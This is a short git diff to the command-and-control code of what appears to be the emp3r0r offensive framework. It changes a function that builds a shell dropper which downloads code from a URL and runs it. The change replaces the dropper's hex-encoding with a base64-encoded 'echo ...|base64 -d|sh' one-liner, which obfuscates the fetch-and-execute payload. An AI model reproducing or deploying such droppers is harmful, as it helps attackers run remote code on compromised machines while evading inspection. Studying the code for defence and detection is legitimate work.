@@ -1,14 +1,15 @@
 package cc
 
 import (
+	"encoding/base64"
 	"fmt"
 	"strings"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
-// bash_http_downloader download whatever from the url and execute it
-func bash_http_downloader(url string) []byte {
+// bash_http_b64_download_exec download whatever from the url and execute it
+func bash_http_b64_download_exec(url string) []byte {
 	if !strings.HasPrefix(url, "http://") {
 		url = fmt.Sprintf("http://%s", url)
 	}
@@ -28,7 +29,7 @@ rm -f /tmp/%s*`
 		temp_name, temp_name, dropper_name, dropper_name, dropper_name, temp_name)
 
 	// hex encoded payload
-	payload = util.HexEncode(payload)
-	dropper := fmt.Sprintf("echo -e \"%s\"|sh", payload)
+	payload = base64.StdEncoding.EncodeToString([]byte(payload))
+	dropper := fmt.Sprintf(`echo '%s'|base64 -d|sh`, payload)
 	return []byte(dropper)
 }
